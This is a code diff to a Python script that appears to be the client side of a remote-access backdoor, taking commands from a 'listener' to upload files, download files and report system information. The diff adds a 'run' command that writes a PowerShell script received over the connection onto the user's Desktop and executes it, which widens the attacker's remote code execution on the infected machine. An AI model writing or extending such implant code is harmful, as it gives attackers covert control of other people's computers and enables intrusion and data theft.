@@ -32,8 +32,8 @@ def read_file(path):
 # Download File From Listener
 def write_file( path, content):
     try:
-        desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-        file_path = os.path.join(desktop_path, path)
+        # desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+        # file_path = os.path.join(desktop_path, path)
         # print(desktop_path)
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
@@ -92,6 +92,11 @@ def receive_commands():
             file_path = os.path.join(file_path, file_name)
             command_result = write_file(path=file_path, content=received_command[3])
             
+        elif received_command[0] == "run":
+            command_result = run_powerShell_script(received_command[1],received_command[2])
+
+            
+            
 
         elif received_command[0] == "download":
             command_result = read_file(received_command[1])
@@ -105,10 +110,17 @@ def receive_commands():
         else:
             reliable_send([command_result , "\n[ " + os.getcwd() + " ]>"])
             
-            
-        
-
     s.close() 
+    
+# run powerShell script
+def run_powerShell_script(fileName,data):
+    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+    file_path = os.path.join(desktop_path, fileName)
+
+    write_file(path=file_path, content=data)
+    result = execute_command("PowerShell -File " + file_path)
+    return result
+    
 
 def get_system_info():
     sysInfo = platform.uname()
